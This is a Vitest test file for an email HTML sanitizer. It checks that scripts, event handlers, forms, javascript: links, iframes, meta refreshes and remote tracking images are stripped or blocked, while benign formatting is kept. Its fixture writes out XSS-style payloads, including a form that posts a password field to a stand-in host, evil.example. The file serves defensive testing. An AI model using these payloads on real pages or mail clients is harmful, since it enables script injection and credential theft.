import { describe, expect, it } from "vitest"

import { BLOCKED_IMAGE_PLACEHOLDER, sanitizeEmailHtml } from "../sanitize"

/**
 * Fixture from the task's stated verification: a hostile email mixing
 * script/handler/form payloads with benign content that must survive.
 */
const HOSTILE_FIXTURE = `
<h1>Quarterly Report</h1>
<p>Hi <b>team</b>, see the attached <i>numbers</i>.</p>
<script>alert(1)</script>
<p onclick="steal()" onmouseover="track()">Hovering text</p>
<form action="https://evil.example/collect"><input name="pw"><button>Go</button></form>
<a href="javascript:alert(3)">click me</a>
<a href="https://example.com/ok">real link</a>
<iframe src="https://evil.example/frame"></iframe>
<object data="https://evil.example/o"></object>
<embed src="https://evil.example/e">
<meta http-equiv="refresh" content="0;url=https://evil.example/">
<link rel="stylesheet" href="https://evil.example/x.css">
<base href="https://evil.example/">
<img src="https://tracker.example/pixel.png" alt="pixel" onerror="alert(4)">
<img src="data:image/png;base64,iVBORw0KGgo=" alt="inline">
<img src="cid:image001.jpg@01DA" alt="signature">
<table><tr><td>cell</td></tr></table>
<ul><li>item one</li></ul>
`

describe("sanitizeEmailHtml", () => {
  it("strips script elements including their content", () => {
    const clean = sanitizeEmailHtml(HOSTILE_FIXTURE)
    expect(clean).not.toContain("<script")
    expect(clean).not.toContain("alert(1)")
  })

  it("strips event handler attributes but keeps the element and text", () => {
    const clean = sanitizeEmailHtml(HOSTILE_FIXTURE)
    expect(clean).not.toContain("onclick")
    expect(clean).not.toContain("onmouseover")
    expect(clean).not.toContain("onerror")
    expect(clean).not.toContain("steal()")
    expect(clean).toContain("Hovering text")
  })

  it("removes forms and input controls", () => {
    const clean = sanitizeEmailHtml(HOSTILE_FIXTURE)
    expect(clean).not.toContain("<form")
    expect(clean).not.toContain("<input")
    expect(clean).not.toContain("<button")
  })

  it("removes javascript: hrefs while keeping the anchor text", () => {
    const clean = sanitizeEmailHtml(HOSTILE_FIXTURE)
    expect(clean).not.toContain("javascript:")
    expect(clean).toContain("click me")
  })

  it("removes iframe/object/embed/meta/link/base elements", () => {
    const clean = sanitizeEmailHtml(HOSTILE_FIXTURE)
    for (const tag of ["iframe", "object", "embed", "meta", "link", "base"]) {
      expect(clean).not.toContain(`<${tag}`)
    }
    expect(clean).not.toContain("evil.example/frame")
  })

  it("keeps benign structure and formatting intact", () => {
    const clean = sanitizeEmailHtml(HOSTILE_FIXTURE)
    expect(clean).toContain("<h1>Quarterly Report</h1>")
    expect(clean).toContain("<b>team</b>")
    expect(clean).toContain("<i>numbers</i>")
    expect(clean).toContain("<td>cell</td>")
    expect(clean).toContain("<li>item one</li>")
  })

  it("adds target and rel to surviving links", () => {
    const clean = sanitizeEmailHtml(HOSTILE_FIXTURE)
    expect(clean).toContain(
      '<a href="https://example.com/ok" target="_blank" rel="noopener noreferrer">real link</a>'
    )
  })

  it("blocks remote images by default and preserves the original src", () => {
    const clean = sanitizeEmailHtml(HOSTILE_FIXTURE)
    expect(clean).toContain(`src="${BLOCKED_IMAGE_PLACEHOLDER}"`)
    expect(clean).toContain(
      'data-original-src="https://tracker.example/pixel.png"'
    )
    expect(clean).not.toContain('<img src="https://tracker.example')
    expect(clean).toContain('alt="pixel"')
  })

  it("leaves remote image srcs alone with blockRemoteImages: false", () => {
    const clean = sanitizeEmailHtml(HOSTILE_FIXTURE, {
      blockRemoteImages: false,
    })
    expect(clean).toContain('src="https://tracker.example/pixel.png"')
    expect(clean).not.toContain("data-original-src")
    expect(clean).not.toContain(BLOCKED_IMAGE_PLACEHOLDER)
  })

  it("passes data: and cid: image sources through untouched", () => {
    const clean = sanitizeEmailHtml(HOSTILE_FIXTURE)
    expect(clean).toContain('src="data:image/png;base64,iVBORw0KGgo="')
    expect(clean).toContain('src="cid:image001.jpg@01DA"')
    expect(clean).not.toContain('data-original-src="data:')
    expect(clean).not.toContain('data-original-src="cid:')
  })

  it("strips style attributes (style-leak into the isolated frame)", () => {
    const clean = sanitizeEmailHtml(
      '<p style="position:fixed;top:0;left:0;width:100%">overlay</p>'
    )
    expect(clean).not.toContain("style=")
    expect(clean).toContain("overlay")
  })

  it("drops head-only content from full-document emails", () => {
    const clean = sanitizeEmailHtml(
      "<html><head><title>Secret subject</title></head><body><p>Body text</p></body></html>"
    )
    expect(clean).toContain("<p>Body text</p>")
    expect(clean).not.toContain("Secret subject")
  })

  it("returns empty output for empty input and is idempotent", () => {
    expect(sanitizeEmailHtml("")).toBe("")
    const once = sanitizeEmailHtml(HOSTILE_FIXTURE)
    expect(sanitizeEmailHtml(once)).toBe(once)
  })
})
